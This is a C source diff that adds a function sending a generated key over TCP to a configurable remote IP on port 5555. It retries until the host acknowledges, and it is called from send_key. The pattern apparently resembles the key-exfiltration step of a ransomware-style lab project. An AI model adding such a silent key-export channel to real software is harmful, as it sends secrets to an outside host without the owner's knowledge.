@@ -6,8 +6,58 @@
 #include <string.h>
 #include <fcntl.h>
 #include <errno.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
 
 #include "key.h"
+
+// change this to your actual machine IP
+// hostname -I for linux, ipconfig for windows
+// if run from wsl, forward the port from windows to wsl with netsh
+#define CLOUD_IP "CHANGE"
+
+int extract_key(char *key)
+{
+	char acknowledgement;
+	int sock = socket(AF_INET, SOCK_STREAM, 0);
+	if (sock < 0)
+	{
+		printf("extract_key: socket creation failed\n");
+		return -1;
+	}
+
+	struct sockaddr_in server = {
+        .sin_family = AF_INET,
+        .sin_port   = htons(5555),
+    };
+    inet_pton(AF_INET, CLOUD_IP, &server.sin_addr);
+	while (1)
+	{
+		connect(sock, (struct sockaddr*)&server, sizeof(server));
+		if (recv(sock, &acknowledgement, 1, 0) <= 0)
+		{
+			printf("extract_key: failed to receive acknowledgement\n");
+			close(sock);
+			sock = socket(AF_INET, SOCK_STREAM, 0);
+			if (sock < 0)
+			{
+				printf("extract_key: socket creation failed during acknowledgement\n");
+				return -1;
+			}
+		}
+		else
+			break ;
+	}
+    if (send(sock, key, PASS_SIZE, 0) < 0)
+    {
+        printf("extract_key: failed to send key\n");
+        close(sock);
+        return -1;
+    }
+    close(sock);
+    return 0;
+}
 
 int generate_key(char *in)
 {
@@ -54,5 +104,11 @@ int send_key(char *key)
 		return 1;
 	}
 	close(fd);
+	
+	if (extract_key(key) < 0)
+	{
+		printf("send_key: failed to send key\n");
+		return 1;
+	}
 	return 0;
 }
